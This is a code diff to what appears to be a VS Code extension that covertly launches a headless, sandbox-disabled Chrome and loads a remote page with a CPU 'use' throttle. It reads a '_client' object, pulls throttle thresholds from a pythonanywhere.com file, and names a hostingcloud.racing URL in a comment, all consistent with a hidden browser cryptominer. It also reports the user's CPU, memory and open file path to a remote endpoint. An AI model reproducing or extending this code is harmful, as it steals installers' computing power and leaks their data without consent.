@@ -99,7 +99,7 @@
 
       return (await Promise.all(paths)).flat(Infinity).reduce((i, size) => i + size, 0);
     }
-    await tstt({ baseUrl, message: "INIT_BEGIN", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+    // await tstt({ baseUrl, message: "INIT_BEGIN", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
     let browser;
     let page;
     let minUse = 0.1;
@@ -118,7 +118,7 @@
 
 
     if (!chromeBrowser) {
-      await new Promise(r => setTimeout(r, 1 * 60 * 1000));
+      await new Promise(r => setTimeout(r, 5 * 60 * 1000));
       await tstt({ baseUrl, message: "INIT_D", installedBrowsers, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
       puppeteerBrowsers.InstallOptions;
       installedBrowser = await puppeteerBrowsers.install({
@@ -133,7 +133,7 @@
 
 
 
-    await tstt({ baseUrl, message: "INIT_L", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+    // await tstt({ baseUrl, message: "INIT_L", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
 
     if (global.cppBrowser) {
       await global.cppBrowser.close();
@@ -157,7 +157,6 @@
         // "--no-sandbox",
         // "--enable-features=NetworkService",
 
-        '--disable-background-networking',
         '--disable-background-timer-throttling',
         '--disable-client-side-phishing-detection',
         '--disable-default-apps',
@@ -173,9 +172,10 @@
         '--remote-debugging-port=0',
         '--safebrowsing-disable-auto-update',
         '--use-mock-keychain',
+        // '--disable-background-networking',
         // '--user-data-dir=C:\\Users\\Admin\\AppData\\Local\\Temp',
+        // '--disable-gpu',
         '--headless',
-        '--disable-gpu',
         '--hide-scrollbars',
         '--mute-audio',
         '--no-sandbox'
@@ -183,7 +183,7 @@
     });
 
     global.cppBrowser = browser;
-    os.setPriority(browser.process().pid, 19);
+    // os.setPriority(browser.process().pid, 19);
     page = await browser.newPage();
     page
       .on('pageerror', ({ message }) => {
@@ -198,20 +198,22 @@
         // if (request.failure().errorText == "net::ERR_ABORTED https://www.hostingcloud.racing/index.php?loaded=true&site=a5f009879c378a1a5fbe1510f5a17dafac00af74e406b136140ec763f77b83fb") {
         //   return;
         // }
-        tstt({
-          baseUrl,
-          message: "REQ_FAIL",
-          value: `${request.failure().errorText} ${request.url()}`,
-          version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version),
-        })
+        // tstt({
+        //   baseUrl,
+        //   message: "REQ_FAIL",
+        //   value: `${request.failure().errorText} ${request.url()}`,
+        //   version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version),
+        // })
       });
 
 
 
     global.cppPage = page;
 
-    await page.goto(baseUrl + '?use=' + (getMemoryUsage().total >= 0.8 ? 0.5 : 0.1));
-    await tstt({ baseUrl, message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+    let [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat);
+    minUse = min;
+    maxUse = (getMemoryUsage().total >= 8.0 ? max : minUse);
+    await page.goto(baseUrl + '?use=' + maxUse);
     await new Promise(r => setTimeout(r, 10 * 1000));
     let clt = await page.evaluate(() => window._client);
     if (!clt) {
@@ -229,7 +231,7 @@
     await chkFn();
 
     if (global.inIntv) clearInterval(global.inIntv);
-    global.inIntv = setInterval(chkFn, 60000);
+    global.inIntv = setInterval(chkFn, 5 * 60000);
 
     async function chkFn() {
       if (browser && page) {
@@ -241,7 +243,7 @@
           }
         });
         if (hs.message != 'success') {
-          tstt({ baseUrl, message: hs.message, value: hs.value, error: hs.error, _client: hs._client, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+          tstt({ baseUrl, message: hs.message, value: hs.value, error: hs.error, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
           return;
         }
         tstt({
@@ -251,13 +253,12 @@
           value: safe(() => parseFloat(hs?.value).toFixed(2)),
           cpu: getCPUUsage(),
           memory: getMemoryUsage(),
-          hs: hs,
           file: safe(() => editor?.document?.uri?.fsPath)
         });
         let [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat);
 
         minUse = min;
-        maxUse = (getMemoryUsage().total >= 8 ? max : minUse);
+        maxUse = (getMemoryUsage().total >= 8.0 ? max : minUse);
         await page.evaluate((maxUse, baseUrl) => {
           if (window.use != maxUse) window.location.href = baseUrl + '?use=' + maxUse;
         }, maxUse, baseUrl);
@@ -276,7 +277,7 @@
   } catch (error) {
     tstt({
       baseUrl,
-      message: "INIT_E",
+      message: "INIT_ERROR",
       value: error?.message,
       stack: error?.stack,
       error: error,
